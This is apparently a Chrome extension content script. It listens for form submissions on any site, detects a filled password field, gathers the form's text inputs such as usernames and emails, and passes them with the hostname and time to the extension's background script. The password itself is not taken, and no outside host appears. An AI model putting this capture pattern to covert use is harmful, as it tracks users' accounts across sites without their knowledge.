// This listener catches the 'submit' event and get the form data when login or signed-ups happen.
document.addEventListener("submit", function(e) {
  var mURL;
  
  var mInputs = document.getElementsByTagName("input");
  var mForm;
  var mTexts;
  
  var mType;
  
  var mDate;
  var mLocalTime;
  
  // find the filled password
  for (var i = 0; i < mInputs.length; i++) {
    if (mInputs[i].type.toLowerCase() === "password") {
      if(mInputs[i].value) {
        // get the form including the password
        mForm = mInputs[i].form;
        mTexts = $("#" + mForm.id + " :text").serializeArray();
        
        // check the tyep
        if(mTexts.length > 1)
          mType = "Sign-up";
        else
          mType = "Login";
      
        // get the current URL
        mURL = window.location.hostname;
        
        // get the current local time
        mDate = new Date();
        mLocalTime = (mDate.getMonth()+1) + '/' + mDate.getDate() + '/' + mDate.getFullYear() + ' ' + mDate.getHours() + ':' + mDate.getMinutes() + ':' + mDate.getSeconds();
        
        // send the mesasge to the background
        chrome.runtime.sendMessage({action: "GetInput", url: mURL, type: mType, data: mTexts, time: mLocalTime}, function(response) {
          
        });
        break;
      }
    }
  }
});

